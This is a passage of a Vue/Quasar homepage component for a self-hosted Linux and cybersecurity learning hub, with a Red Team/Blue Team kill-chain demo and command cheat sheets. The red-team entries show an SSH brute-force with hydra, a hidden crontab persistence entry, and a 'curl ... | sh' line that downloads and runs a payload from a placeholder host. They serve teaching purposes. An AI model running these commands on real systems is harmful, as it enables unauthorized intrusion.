<template>
  <q-page ref="root" class="home">
    <!-- HERO -->
    <section id="top" class="hero">
      <canvas ref="rain" class="rain" aria-hidden="true"></canvas>
      <div class="hero-glow" aria-hidden="true"></div>

      <div class="wrap hero-grid">
        <div class="hero-copy">
          <div class="pill reveal">
            <span class="pill-dot"></span>
            <span class="mono">uptime: online</span>
            <span class="pill-sep"></span>
            Hands-on IT learning, self-hosted
          </div>

          <h1 class="reveal" style="--d: 60ms">
            <span class="h1-line">Explore.</span>
            <span class="h1-line">Configure.</span>
            <span class="h1-line h1-hot">Secure.</span>
          </h1>

          <p class="hero-sub reveal" style="--d: 120ms">
            Your gateway to practical IT and server administration.
          </p>

          <p class="hero-desc reveal" style="--d: 180ms">
            Explore hands-on lessons in Linux server management, networking, cybersecurity, and
            essential server services. Learn through real commands, practical configurations,
            network architectures, and security monitoring tools designed to help you develop
            the skills needed to manage, troubleshoot, and secure modern IT infrastructure.
          </p>


          <div class="hero-actions reveal" style="--d: 240ms">
            <q-btn
              unelevated
              no-caps
              class="btn-primary"
              label="Explore Learning Hub"
              icon-right="arrow_downward"
              @click="goTo('areas')"
            />
            <q-btn
              outline
              no-caps
              class="btn-ghost"
              label="Try the live terminal"
              icon-right="terminal"
              @click="goTo('lab')"
            />
          </div>
        </div>

        <div class="visual reveal" style="--d: 200ms">
          <div class="terminal terminal-hero">
            <div class="terminal-bar">
              <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
              <em class="mono">{{ scenes[scene].title }}</em>
              <div class="scene-tabs">
                <i v-for="(s, i) in scenes" :key="s.title" :class="{ on: i === scene }"></i>
              </div>
            </div>
            <div class="terminal-body mono" aria-label="Animated terminal demo">
              <div v-for="(line, i) in lines" :key="scene + '-' + i" :class="['tl', line.type]">
                <template v-if="line.type === 'cmd'"
                  ><b>tjmedina@pi:~$</b> {{ line.text }}</template
                >
                <template v-else>{{ line.text }}</template>
              </div>
              <div class="tl cmd">
                <b>tjmedina@pi:~$</b> {{ typing }}<span class="cursor"></span>
              </div>
            </div>
          </div>

          <div class="chip chip-status">
            <span class="status-dot" :class="{ off: apiStatus !== 'Online' }"></span>
            Django API Â· {{ apiStatus }}
          </div>

          <div class="chip chip-nodes" aria-hidden="true">
            <div v-for="node in nodes" :key="node.icon" class="node">
              <q-icon :name="node.icon" size="18px" />
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- TECH TICKER -->
    <section class="ticker" aria-hidden="true">
      <div class="ticker-track mono">
        <span v-for="(t, i) in tickerItems" :key="i">{{ t }}</span>
        <span v-for="(t, i) in tickerItems" :key="'b' + i">{{ t }}</span>
      </div>
    </section>

    <!-- STATS -->
    <section ref="statsEl" class="wrap stats reveal" data-stats>
      <div v-for="(stat, i) in stats" :key="stat.label" class="stat">
        <div class="stat-value">{{ counts[i] }}{{ stat.suffix }}</div>
        <div class="stat-label">{{ stat.label }}</div>
      </div>
    </section>

    <!-- LEARNING AREAS -->
    <section id="areas" class="section">
      <div class="wrap">
        <div class="section-head reveal">
          <h2>Explore Learning Areas</h2>
          <p>
            Eight focused tracks that move from core Linux and networking skills into container
            deployment, offensive and defensive security, and server hardening.
          </p>
        </div>

        <div class="area-grid">
          <article
            v-for="(area, i) in areas"
            :key="area.key"
            class="area-card reveal"
            :class="[`accent-${area.key}`, { soon: !area.to }]"
            :style="{ '--d': `${(i % 2) * 70}ms` }"
            @mousemove="spot"
          >
            <div class="area-top">
              <div class="area-icon"><q-icon :name="area.icon" size="26px" /></div>
              <span v-if="!area.to" class="badge">Coming soon</span>
              <span v-else class="area-category">{{ area.category }}</span>
            </div>

            <h3>{{ area.title }}</h3>
            <p>{{ area.desc }}</p>

            <div class="area-cmd mono"><b>$</b> {{ area.cmd }}</div>

            <ul class="topics">
              <li v-for="topic in area.topics" :key="topic">{{ topic }}</li>
            </ul>

            <q-btn
              v-if="area.to"
              unelevated
              no-caps
              class="area-cta"
              :label="area.cta"
              icon-right="arrow_forward"
              :to="area.to"
            />
          </article>
        </div>
      </div>
    </section>

    <!-- LIVE LAB -->
    <section id="lab" class="section section-alt">
      <div class="wrap lab-grid">
        <div class="lab-copy reveal">
          <h2>A terminal you can actually type in</h2>
          <p>
            This is a safe, simulated shell that runs right in your browser. Nothing here touches a
            real system, so you can explore freely. Run a command to see the kind of output you will
            meet in the lessons.
          </p>
          <p class="lab-hint">Click a command to run it, or type your own and press Enter.</p>
          <div class="quick">
            <button
              v-for="c in quickCmds"
              :key="c"
              class="quick-btn mono"
              :disabled="busy"
              @click="runQuick(c)"
            >
              {{ c }}
            </button>
          </div>
          <ul class="lab-list">
            <li>
              <q-icon name="check_circle" size="18px" /> Use the Up and Down arrows for history
            </li>
            <li>
              <q-icon name="check_circle" size="18px" /> Type <code class="mono">help</code> to list
              every command
            </li>
            <li>
              <q-icon name="check_circle" size="18px" /> Type <code class="mono">clear</code> to
              reset the screen
            </li>
          </ul>
        </div>

        <div class="terminal terminal-lab reveal" style="--d: 120ms" @click="focusTerm">
          <div class="terminal-bar">
            <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
            <em class="mono">tjmedina@pi: ~/learning-hub</em>
          </div>
          <div ref="termBody" class="terminal-body lab-body mono">
            <div v-for="(l, i) in termLog" :key="i" :class="['tl', l.t]">
              <template v-if="l.t === 'cmd'"><b>tjmedina@pi:~$</b> {{ l.x }}</template>
              <template v-else>{{ l.x }}</template>
            </div>
            <label class="tl cmd input-row">
              <b>tjmedina@pi:~$</b>
              <input
                ref="termInputEl"
                v-model="termInput"
                class="term-input mono"
                type="text"
                autocomplete="off"
                autocapitalize="off"
                spellcheck="false"
                aria-label="Terminal input"
                :disabled="busy"
                @keydown.enter.prevent="submitTerm"
                @keydown.up.prevent="histNav(-1)"
                @keydown.down.prevent="histNav(1)"
              />
            </label>
          </div>
        </div>
      </div>
    </section>

    <!-- NETWORK -->
    <section id="network" class="section">
      <div class="wrap">
        <div class="section-head reveal">
          <h2>Follow a request through the stack</h2>
          <p>
            Every page you open travels through DNS, a firewall, a reverse proxy, and a container
            before it reaches a database. Understanding each hop is the foundation of both
            networking and security.
          </p>
        </div>

        <div class="net reveal">
          <svg
            viewBox="0 0 800 270"
            class="net-svg"
            role="img"
            aria-label="Animated network diagram showing a request passing a firewall, a reverse proxy, and reaching a database, while a blocked packet is dropped at the firewall"
          >
            <defs>
              <path id="p1" d="M110 120 H290" />
              <path id="p2" d="M330 120 H462" />
              <path id="p3" d="M558 120 H690" />
              <path id="p4" d="M110 200 H275" />
            </defs>

            <g class="net-lines">
              <use href="#p1" />
              <use href="#p2" />
              <use href="#p3" />
              <use href="#p4" />
            </g>

            <g class="net-node">
              <rect x="20" y="85" width="90" height="70" rx="14" />
              <text x="65" y="116" class="nt">Client</text>
              <text x="65" y="134" class="ns">browser</text>
            </g>
            <g class="net-node fw">
              <rect x="290" y="70" width="40" height="100" rx="10" />
              <text x="310" y="124" class="nt" transform="rotate(-90 310 124)">UFW</text>
            </g>
            <g class="net-node">
              <rect x="462" y="78" width="96" height="84" rx="12" />
              <text x="510" y="106" class="nt">Nginx</text>
              <text x="510" y="124" class="ns">:443</text>
              <text x="510" y="146" class="ns dim">Docker host</text>
            </g>
            <g class="net-node db">
              <rect x="690" y="85" width="90" height="70" rx="14" />
              <text x="735" y="116" class="nt">MySQL</text>
              <text x="735" y="134" class="ns">:3306 private</text>
            </g>
            <g class="net-node bad">
              <rect x="20" y="170" width="90" height="60" rx="14" />
              <text x="65" y="198" class="nt">Scanner</text>
              <text x="65" y="214" class="ns">port 23</text>
            </g>

            <text x="200" y="108" class="ns">:443</text>
            <text x="396" y="108" class="ns">:8000</text>
            <text x="624" y="108" class="ns">:3306</text>
            <text x="215" y="188" class="ns bad-t">dropped</text>

            <circle r="5" class="pkt ok">
              <animateMotion dur="1.8s" repeatCount="indefinite" begin="0s">
                <mpath href="#p1" />
              </animateMotion>
            </circle>
            <circle r="5" class="pkt ok">
              <animateMotion dur="1.8s" repeatCount="indefinite" begin="0.9s">
                <mpath href="#p2" />
              </animateMotion>
            </circle>
            <circle r="5" class="pkt ok">
              <animateMotion dur="1.8s" repeatCount="indefinite" begin="1.8s">
                <mpath href="#p3" />
              </animateMotion>
            </circle>
            <circle r="5" class="pkt evil">
              <animateMotion dur="1.8s" repeatCount="indefinite" begin="0.4s">
                <mpath href="#p4" />
              </animateMotion>
              <animate
                attributeName="opacity"
                values="1;1;0"
                keyTimes="0;0.85;1"
                dur="1.8s"
                repeatCount="indefinite"
                begin="0.4s"
              />
            </circle>
          </svg>

          <div class="net-legend">
            <span><i class="lg ok"></i> Allowed traffic follows the rules</span>
            <span><i class="lg evil"></i> Unrequested ports are dropped at the firewall</span>
            <span><i class="lg db"></i> The database is never exposed to the internet</span>
          </div>
        </div>
      </div>
    </section>

    <!-- RED / BLUE KILL CHAIN -->
    <section id="redblue" class="section section-alt">
      <div class="wrap">
        <div class="section-head reveal">
          <h2>Attack and defense, side by side</h2>
          <p>
            Select a stage of an intrusion to see what an attacker does, and how a defender spots
            and stops it. The demo advances on its own until you choose a stage.
          </p>
        </div>

        <div class="chain reveal">
          <div class="chain-steps" role="tablist">
            <button
              v-for="(s, i) in chain"
              :key="s.name"
              role="tab"
              :aria-selected="i === stage"
              :class="['chain-step', { on: i === stage, done: i < stage }]"
              @click="pickStage(i)"
            >
              <span class="mono">{{ i + 1 }}</span>
              {{ s.name }}
            </button>
            <div class="chain-bar">
              <i :style="{ width: ((stage + 1) / chain.length) * 100 + '%' }"></i>
            </div>
          </div>

          <div class="chain-panels">
            <div class="chain-panel red" :key="'r' + stage">
              <div class="cp-head">
                <q-icon name="gpp_bad" size="20px" /> Red Team: the attacker
              </div>
              <p>{{ chain[stage].red }}</p>
              <div class="cp-cmd mono"><b>$</b> {{ chain[stage].redCmd }}</div>
            </div>
            <div class="chain-panel blue" :key="'b' + stage">
              <div class="cp-head">
                <q-icon name="shield" size="20px" /> Blue Team: the defender
              </div>
              <p>{{ chain[stage].blue }}</p>
              <div class="cp-cmd mono"><b>$</b> {{ chain[stage].blueCmd }}</div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- DEFENSE IN DEPTH + DOCKER -->
    <section id="layers" class="section">
      <div class="wrap layers-grid">
        <div class="reveal">
          <div class="section-head tight">
            <h2>Security works in layers</h2>
            <p>
              No single control is enough. Strong systems stack several, so that when one fails, the
              next one still holds.
            </p>
          </div>
          <ol class="layers">
            <li v-for="(l, i) in layers" :key="l.title" :style="{ '--i': i }">
              <div class="layer-icon"><q-icon :name="l.icon" size="20px" /></div>
              <div>
                <h3>{{ l.title }}</h3>
                <p>{{ l.text }}</p>
              </div>
            </li>
          </ol>
        </div>

        <div class="reveal" style="--d: 120ms">
          <div class="section-head tight">
            <h2>Containers, explained simply</h2>
            <p>
              Docker packages an application with everything it needs, so it runs the same on a
              laptop, a server, or a Raspberry Pi.
            </p>
          </div>
          <div class="stack" aria-label="Docker stack diagram">
            <div class="stack-row s-ctr">
              <div class="box">web<br /><small class="mono">nginx</small></div>
              <div class="box">api<br /><small class="mono">django</small></div>
              <div class="box">db<br /><small class="mono">mysql</small></div>
            </div>
            <div class="stack-row s-eng">Docker Engine + Compose network</div>
            <div class="stack-row s-os">Linux kernel Â· namespaces Â· cgroups</div>
            <div class="stack-row s-hw">Raspberry Pi hardware</div>
          </div>
          <ul class="mini-list">
            <li><b>Image:</b> a read-only template for an app.</li>
            <li><b>Container:</b> a running, isolated instance of an image.</li>
            <li><b>Volume:</b> storage that survives a restart.</li>
            <li><b>Network:</b> private links so containers can talk safely.</li>
          </ul>
        </div>
      </div>
    </section>

    <!-- CHEAT SHEET -->
    <section id="cheats" class="section section-alt">
      <div class="wrap">
        <div class="section-head reveal">
          <h2>Command cheat sheet</h2>
          <p>The commands you will reach for most often. Click any command to copy it.</p>
        </div>

        <div class="cheat reveal">
          <div class="cheat-tabs" role="tablist">
            <button
              v-for="(g, k) in cheats"
              :key="k"
              role="tab"
              :aria-selected="cheatTab === k"
              :class="['cheat-tab', { on: cheatTab === k }]"
              @click="cheatTab = k"
            >
              <q-icon :name="g.icon" size="18px" /> {{ g.title }}
            </button>
          </div>

          <div class="cheat-list" :key="cheatTab">
            <button
              v-for="(c, i) in cheats[cheatTab].items"
              :key="c.cmd"
              class="cheat-row"
              :style="{ '--i': i }"
              @click="copyCmd(c.cmd)"
            >
              <code class="mono">{{ c.cmd }}</code>
              <span>{{ c.desc }}</span>
              <em class="mono">{{ copied === c.cmd ? 'copied' : 'copy' }}</em>
            </button>
          </div>
        </div>
      </div>
    </section>

    <!-- FEATURES -->
    <section id="features" class="section">
      <div class="wrap">
        <div class="section-head reveal">
          <h2>Built for Practical Learning</h2>
          <p>A focused platform that keeps the learning clear, structured, and hands-on.</p>
        </div>

        <div class="feature-grid">
          <div
            v-for="(f, i) in features"
            :key="f.title"
            class="feature reveal"
            :style="{ '--d': `${i * 70}ms` }"
          >
            <div class="feature-icon"><q-icon :name="f.icon" size="22px" /></div>
            <h3>{{ f.title }}</h3>
            <p>{{ f.text }}</p>
          </div>
        </div>
      </div>
    </section>

    <!-- LEARNING FLOW -->
    <section id="how" class="section section-alt">
      <div class="wrap">
        <div class="section-head reveal">
          <h2>How You'll Learn</h2>
          <p>A simple path from picking a topic to building something real.</p>
        </div>

        <ol class="steps">
          <li
            v-for="(s, i) in steps"
            :key="s.title"
            class="step reveal"
            :style="{ '--d': `${i * 80}ms` }"
          >
            <div class="step-num mono">{{ String(i + 1).padStart(2, '0') }}</div>
            <h3>{{ s.title }}</h3>
            <p>{{ s.text }}</p>
          </li>
        </ol>
      </div>
    </section>

    <!-- FAQ -->
    <section id="faq" class="section">
      <div class="wrap faq-wrap">
        <div class="section-head reveal">
          <h2>Common questions</h2>
          <p>Quick answers before you start.</p>
        </div>
        <div class="faq reveal">
          <details v-for="f in faqs" :key="f.q" class="faq-item">
            <summary>{{ f.q }}</summary>
            <p>{{ f.a }}</p>
          </details>
        </div>
      </div>
    </section>

    <!-- CTA -->
    <section class="wrap cta-wrap">
      <div class="cta reveal">
        <div class="cta-ring cta-ring-a" aria-hidden="true"></div>
        <div class="cta-ring cta-ring-b" aria-hidden="true"></div>
        <div class="cta-prompt mono"><b>$</b> start --learning<span class="cursor"></span></div>
        <h2>Start Learning Today</h2>
        <p>
          Explore practical IT lessons designed to help you understand the technologies behind
          modern applications and infrastructure.
        </p>
        <q-btn
          unelevated
          no-caps
          class="btn-light"
          label="Explore Learning Hub"
          icon-right="arrow_upward"
          @click="goTo('areas')"
        />
      </div>
    </section>

    <!-- FOOTER -->
    <footer class="footer">
      <div class="wrap footer-grid">
        <div class="footer-brand">
          <div class="brand">
            <span class="brand-mark"><q-icon name="memory" size="20px" /></span>
            <span class="brand-name">Linux Cybersecurity Learning Hub</span>
          </div>
          <p>Practical IT learning, one topic at a time.</p>
        </div>

        <div>
          <div class="footer-title">Navigation</div>
          <router-link to="/">Home</router-link>
          <router-link to="/cybersecurity">Cybersecurity</router-link>
          <router-link to="/docker">Docker</router-link>
          <router-link to="/linux">Linux</router-link>
          <router-link to="/redblue">Red &amp; Blue Team</router-link>
          <router-link to="/networking">Networking</router-link>
        </div>

        <div>
          <div class="footer-title">Technology</div>
          <span v-for="tech in techStack" :key="tech">{{ tech }}</span>
        </div>
      </div>

      <div class="wrap footer-base">
        <span>Â© 2026 Linux Cybersecurity Learning Hub</span>
        <span class="footer-credit">Developed by <strong>Tyrone Justine A. Medina</strong></span>
      </div>
    </footer>
  </q-page>
</template>

<script setup>
import { computed, nextTick, onBeforeUnmount, onMounted, ref } from 'vue'

const root = ref(null)
const rain = ref(null)
const statsEl = ref(null)
const termBody = ref(null)
const termInputEl = ref(null)
const apiStatus = ref('Checking...')

const reduceMotion =
  typeof window !== 'undefined' && window.matchMedia('(prefers-reduced-motion: reduce)').matches

/* ---------------- Static content ---------------- */

const scenes = [
  {
    title: 'pi ~ docker',
    lines: [
      { type: 'cmd', text: 'docker compose up -d' },
      { type: 'ok', text: '[OK] network  learning-hub_default' },
      { type: 'ok', text: '[OK] db       healthy' },
      { type: 'ok', text: '[OK] api      started' },
      { type: 'cmd', text: 'docker ps --format "{{.Names}}  {{.Status}}"' },
      { type: 'out', text: 'web   Up 3 seconds' },
      { type: 'out', text: 'api   Up 3 seconds' },
      { type: 'out', text: 'db    Up 4 seconds (healthy)' },
    ],
  },
  {
    title: 'pi ~ hardening',
    lines: [
      { type: 'cmd', text: 'sudo ufw default deny incoming' },
      { type: 'ok', text: 'Default incoming policy changed to deny' },
      { type: 'cmd', text: 'sudo ufw allow 22/tcp' },
      { type: 'ok', text: 'Rule added' },
      { type: 'cmd', text: 'sudo ufw enable' },
      { type: 'ok', text: 'Firewall is active and enabled on system startup' },
      { type: 'cmd', text: 'sudo aa-status | head -n 2' },
      { type: 'out', text: 'apparmor module is loaded.' },
      { type: 'out', text: '38 profiles are loaded.' },
    ],
  },
  {
    title: 'pi ~ networking',
    lines: [
      { type: 'cmd', text: 'ping -c 2 learninghub.local' },
      { type: 'out', text: '64 bytes from 192.168.1.20: time=0.41 ms' },
      { type: 'out', text: '64 bytes from 192.168.1.20: time=0.39 ms' },
      { type: 'cmd', text: 'ss -tuln | grep LISTEN' },
      { type: 'out', text: 'tcp  LISTEN  0.0.0.0:22    (ssh)' },
      { type: 'out', text: 'tcp  LISTEN  0.0.0.0:443   (https)' },
      { type: 'warn', text: 'tcp  LISTEN  127.0.0.1:3306 (mysql, local only)' },
    ],
  },
  {
    title: 'pi ~ monitoring',
    lines: [
      { type: 'cmd', text: 'sudo suricata -T -c /etc/suricata/suricata.yaml' },
      { type: 'ok', text: 'Configuration provided was successfully loaded' },
      { type: 'cmd', text: 'sudo tail -n 2 /var/log/suricata/fast.log' },
      { type: 'warn', text: '[**] ET SCAN Nmap Scripting Engine [**]' },
      { type: 'warn', text: '[**] ET POLICY SSH brute force attempt [**]' },
    ],
  },
]

const nodes = [{ icon: 'memory' }, { icon: 'inventory_2' }, { icon: 'api' }]

const tickerItems = [
  'bash',
  'ssh',
  'ufw',
  'nftables',
  'apparmor',
  'docker compose',
  'nginx',
  'squid',
  'mysql',
  'vsftpd',
  'suricata',
  'security onion',
  'tcp/ip',
  'dns',
  'iptables',
  'systemd',
  'chmod 640',
  'fail2ban',
]

/* `to` is the existing route. Areas without `to` render as "Coming soon". */
const areas = [
  {
    key: 'cyber',
    category: 'Security',
    title: 'Cybersecurity',
    icon: 'security',
    desc: 'Learn how systems, networks, applications, and data are protected against cyber threats, starting from the CIA triad and building toward real defensive practice.',
    cmd: 'whoami && id',
    topics: [
      'Security fundamentals',
      'Threats and defensive concepts',
      'Practical security knowledge',
    ],
    to: '/cybersecurity',
    cta: 'Explore Cybersecurity',
  },
  {
    key: 'redblue',
    category: 'Cyber Defense',
    title: 'Red Team / Blue Team',
    icon: 'swap_horiz',
    desc: 'Explore offensive and defensive security operations, from attack simulation and detection to incident response and collaboration.',
    cmd: 'nmap -sV 192.168.1.20',
    topics: [
      'Red Team operations',
      'Blue Team defense',
      'Purple Team collaboration',
      'Attack, detection, and response',
    ],
    to: '/redblue',
    cta: 'Explore Red & Blue',
  },
  {
    key: 'docker',
    category: 'Containers',
    title: 'Docker',
    icon: 'inventory_2',
    desc: 'Learn container fundamentals, deployment workflows, and container security, from your first image to a multi-service Compose stack.',
    cmd: 'docker compose up -d',
    topics: [
      'Containers and images',
      'Docker Compose',
      'Networks and volumes',
      'Container security',
    ],
    to: '/docker',
    cta: 'Explore Docker',
  },
  {
    key: 'linux',
    category: 'Systems',
    title: 'Linux',
    icon: 'terminal',
    desc: 'Build Linux command-line skills and learn the fundamentals of server administration, one command at a time.',
    cmd: 'ls -la /etc | less',
    topics: [
      'Linux command line',
      'Files and directories',
      'Users and permissions',
      'System administration',
    ],
    to: '/linux',
    cta: 'Explore Linux',
  },
  {
    key: 'networking',
    category: 'Infrastructure',
    title: 'Networking',
    icon: 'lan',
    desc: 'Understand how devices, networks, servers, and services communicate, and how to read what is happening on the wire.',
    cmd: 'ip a && ss -tuln',
    topics: [
      'IP addressing and DNS',
      'Ports and protocols',
      'Network fundamentals',
      'Client-server communication',
    ],
    to: '/networking',
    cta: 'Explore Networking',
  },
  {
    key: 'linux-services',
    category: 'Server Administration',
    title: 'Linux Server Services',
    icon: 'dns',
    desc: 'Learn how to install, configure, and manage common services on an Ubuntu server, and how to keep them running.',
    cmd: 'sudo systemctl status nginx',
    topics: ['Web Server', 'FTP Server', 'Database Server', 'Squid Proxy Server'],
    to: '/linux/services',
    cta: 'Explore Server Services',
  },
  {
    key: 'linux-hardening',
    category: 'Server Security',
    title: 'Linux Server Security Hardening',
    icon: 'admin_panel_settings',
    desc: 'Secure Linux servers through access controls, system policies, and host-based protection.',
    cmd: 'sudo ufw status verbose',
    topics: [
      'Principle of Least Privilege',
      'User and Group Security',
      'SSH and Firewall Configuration',
      'UFW, nftables, and AppArmor',
    ],
    to: '/linux/hardening',
    cta: 'Explore Security Hardening',
  },
  {
    key: 'linux-monitoring',
    category: 'Security Monitoring',
    title: 'Linux Monitoring Tools',
    icon: 'monitor_heart',
    desc: 'Explore security monitoring platforms and network threat detection tools for Linux environments.',
    cmd: 'sudo tail -f fast.log',
    topics: [
      'Security Onion',
      'Suricata',
      'Installation and Configuration',
      'Security Event Monitoring',
    ],
    to: '/linux/monitoring',
    cta: 'Explore Monitoring Tools',
  },
]

const quickCmds = [
  'help',
  'neofetch',
  'docker ps',
  'ufw status',
  'ping learninghub.local',
  'nmap localhost',
]

const chain = [
  {
    name: 'Recon',
    red: 'The attacker maps the target: open ports, running services, and software versions. This is quiet, and it shapes every later step.',
    redCmd: 'nmap -sV -p- 192.168.1.20',
    blue: 'The defender watches for scan patterns and closes everything that is not needed. Fewer open ports means a smaller attack surface.',
    blueCmd: 'sudo ufw status numbered',
  },
  {
    name: 'Initial access',
    red: 'With a service identified, the attacker tries weak or reused passwords to get a foothold, often against SSH.',
    redCmd: 'hydra -l admin -P rockyou.txt ssh://192.168.1.20',
    blue: 'Key-based login, disabled root login, and rate limiting stop guessing attacks before they succeed.',
    blueCmd: 'sudo fail2ban-client status sshd',
  },
  {
    name: 'Privilege escalation',
    red: 'Inside as a normal user, the attacker looks for misconfigurations: writable files, risky sudo rules, or SUID binaries.',
    redCmd: 'find / -perm -4000 -type f 2>/dev/null',
    blue: 'The Principle of Least Privilege keeps accounts small. Regular audits catch permissions that drifted.',
    blueCmd: 'sudo -l -U tjmedina',
  },
  {
    name: 'Persistence',
    red: 'To keep access after a reboot, the attacker hides a scheduled job or plants a key in an authorized_keys file.',
    redCmd: 'echo "* * * * * /tmp/.x" | crontab -',
    blue: 'File integrity checks and log review reveal unexpected cron entries and new keys.',
    blueCmd: 'sudo ausearch -k cron_change',
  },
  {
    name: 'Detection',
    red: 'Noise gives the attacker away: odd outbound traffic, new processes, and repeated authentication failures.',
    redCmd: 'curl -s http://203.0.113.9/payload | sh',
    blue: 'Suricata and Security Onion raise alerts, and the team contains the host, collects evidence, and recovers.',
    blueCmd: 'sudo tail -f /var/log/suricata/fast.log',
  },
]

const layers = [
  {
    icon: 'router',
    title: 'Network',
    text: 'Firewalls, segmentation, and only the ports you truly need.',
  },
  {
    icon: 'dns',
    title: 'Host',
    text: 'Patched systems, hardened SSH, AppArmor profiles, and least privilege.',
  },
  {
    icon: 'inventory_2',
    title: 'Container',
    text: 'Minimal images, non-root users, read-only filesystems, and pinned versions.',
  },
  {
    icon: 'apps',
    title: 'Application',
    text: 'Input validation, safe authentication, and dependencies kept up to date.',
  },
  {
    icon: 'monitor_heart',
    title: 'Monitoring',
    text: 'Logs and alerts so problems are found in minutes, not months.',
  },
]

const cheats = {
  linux: {
    title: 'Linux',
    icon: 'terminal',
    items: [
      { cmd: 'ls -la', desc: 'List all files with permissions and owners' },
      { cmd: 'chmod 640 file.txt', desc: 'Owner read/write, group read, others none' },
      { cmd: 'sudo useradd -m alice', desc: 'Create a user with a home directory' },
      { cmd: 'journalctl -u ssh -n 20', desc: 'Show the last 20 log lines for a service' },
      { cmd: 'sudo systemctl enable --now nginx', desc: 'Start a service now and at boot' },
      { cmd: 'df -h && free -h', desc: 'Check disk space and memory' },
    ],
  },
  docker: {
    title: 'Docker',
    icon: 'inventory_2',
    items: [
      { cmd: 'docker ps -a', desc: 'List running and stopped containers' },
      { cmd: 'docker compose up -d --build', desc: 'Rebuild and start the whole stack' },
      { cmd: 'docker logs -f api', desc: 'Follow the logs of a container' },
      { cmd: 'docker exec -it db bash', desc: 'Open a shell inside a container' },
      { cmd: 'docker volume ls', desc: 'See persistent storage volumes' },
      { cmd: 'docker system prune', desc: 'Remove unused images and containers' },
    ],
  },
  network: {
    title: 'Networking',
    icon: 'lan',
    items: [
      { cmd: 'ip a', desc: 'Show interfaces and IP addresses' },
      { cmd: 'ss -tuln', desc: 'List listening TCP and UDP ports' },
      { cmd: 'dig example.com', desc: 'Query DNS records for a domain' },
      { cmd: 'traceroute 8.8.8.8', desc: 'See each hop on the path to a host' },
      { cmd: 'curl -I https://example.com', desc: 'Fetch only the HTTP response headers' },
      { cmd: 'sudo tcpdump -i eth0 port 443', desc: 'Capture HTTPS packets on an interface' },
    ],
  },
  security: {
    title: 'Security',
    icon: 'security',
    items: [
      { cmd: 'sudo ufw allow 22/tcp', desc: 'Allow SSH through the firewall' },
      { cmd: 'sudo ufw status verbose', desc: 'Review active firewall rules' },
      { cmd: 'sudo aa-status', desc: 'Check AppArmor profile status' },
      { cmd: 'sudo nft list ruleset', desc: 'Print the full nftables ruleset' },
      { cmd: 'last -n 10', desc: 'Show the 10 most recent logins' },
      { cmd: 'sudo grep "Failed" /var/log/auth.log', desc: 'Find failed login attempts' },
    ],
  },
}

const features = [
  {
    icon: 'account_tree',
    title: 'Structured Lessons',
    text: 'Learn through organized topics that progress from fundamentals to practical concepts.',
  },
  {
    icon: 'science',
    title: 'Hands-On Concepts',
    text: 'Understand how technologies work through commands, examples, architectures, and real-world scenarios.',
  },
  {
    icon: 'dns',
    title: 'IT-Focused Content',
    text: 'Explore technologies commonly used in modern development, infrastructure, and IT environments.',
  },
  {
    icon: 'memory',
    title: 'Linux Server Ready',
    text: 'Designed with lightweight technologies and deployment on Raspberry Pi in mind.',
  },
  {
    icon: 'bolt',
    title: 'Learn at Your Pace',
    text: 'No schedules or deadlines. Open any lesson at any time and continue where you stopped.',
  },
  {
    icon: 'lock',
    title: 'Security First',
    text: 'Security ideas appear in every track, so safe habits form alongside technical skill.',
  },
  {
    icon: 'cloud_off',
    title: 'Self-Hosted',
    text: 'The hub runs on your own hardware, so it works on a local network without third-party services.',
  },
  {
    icon: 'devices',
    title: 'Works on Any Screen',
    text: 'Read lessons comfortably on a desktop, a tablet, or a phone.',
  },
]

const steps = [
  {
    title: 'Choose a topic',
    text: 'Pick a learning area that matches what you want to understand next.',
  },
  {
    title: 'Explore the lesson',
    text: 'Work through clear slides covering concepts, commands, and architecture.',
  },
  {
    title: 'Practice the concepts',
    text: 'Apply ideas with technical examples and real-world scenarios.',
  },
  {
    title: 'Build and deploy',
    text: 'Use what you learned to build, run, and host your own projects.',
  },
]

const faqs = [
  {
    q: 'Do I need any experience to begin?',
    a: 'No. The Linux and Networking tracks start from the basics, and later tracks explain every command they use. Basic computer skills are enough.',
  },
  {
    q: 'Which track should I start with?',
    a: 'Start with Linux, then Networking. Those two give you the foundation for Docker, server services, hardening, and the security tracks.',
  },
  {
    q: 'Is it safe to practice these commands?',
    a: 'Practice on your own virtual machine or lab network. Never run scanning or attack tools against systems you do not own or have written permission to test.',
  },
  {
    q: 'What do I need to follow along?',
    a: 'A Linux virtual machine or an Ubuntu server is ideal. A Raspberry Pi also works well, and Docker runs on both.',
  },
  {
    q: 'What does Red Team vs Blue Team mean?',
    a: 'Red Team simulates attackers to find weaknesses. Blue Team defends, detects, and responds. Purple Team is the collaboration between them so both sides improve.',
  },
]

const techStack = ['Vue', 'Quasar', 'Django', 'MySQL', 'Raspberry Pi']

/* Derived from the areas above, so the numbers stay accurate as topics are added. */
const stats = computed(() => {
  const available = areas.filter((a) => a.to).length
  return [
    { to: available, suffix: '', label: 'Learning topics available' },
    { to: areas.length - available, suffix: '', label: 'More topics coming soon' },
    { to: 60, suffix: '+', label: 'Commands and concepts covered' },
    { to: 100, suffix: '%', label: 'Self-paced and self-hosted' },
  ]
})
const counts = ref([0, 0, 0, 0])
let countersDone = false

function runCounters() {
  if (countersDone) return
  countersDone = true
  const targets = stats.value.map((s) => s.to)
  if (reduceMotion) {
    counts.value = targets
    return
  }
  const start = performance.now()
  const dur = 1300
  const tick = (now) => {
    const p = Math.min(1, (now - start) / dur)
    const e = 1 - Math.pow(1 - p, 3)
    counts.value = targets.map((t) => Math.round(t * e))
    if (p < 1 && alive) requestAnimationFrame(tick)
  }
  requestAnimationFrame(tick)
}

/* ---------------- API status ---------------- */

async function checkApi() {
  try {
    const response = await fetch('/api/status/')
    if (!response.ok) throw new Error('API unavailable')
    const data = await response.json()
    apiStatus.value = data.status === 'online' ? 'Online' : 'Offline'
  } catch {
    apiStatus.value = 'Offline'
  }
}

/* ---------------- Navigation ---------------- */

function goTo(id) {
  if (id === 'top') {
    window.scrollTo({ top: 0, behavior: 'smooth' })
    return
  }
  document.getElementById(id)?.scrollIntoView({ behavior: 'smooth', block: 'start' })
}

function spot(e) {
  const el = e.currentTarget
  const r = el.getBoundingClientRect()
  el.style.setProperty('--mx', `${e.clientX - r.left}px`)
  el.style.setProperty('--my', `${e.clientY - r.top}px`)
}

/* ---------------- Hero terminal typing ---------------- */

let alive = true
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const scene = ref(0)
const lines = ref([])
const typing = ref('')

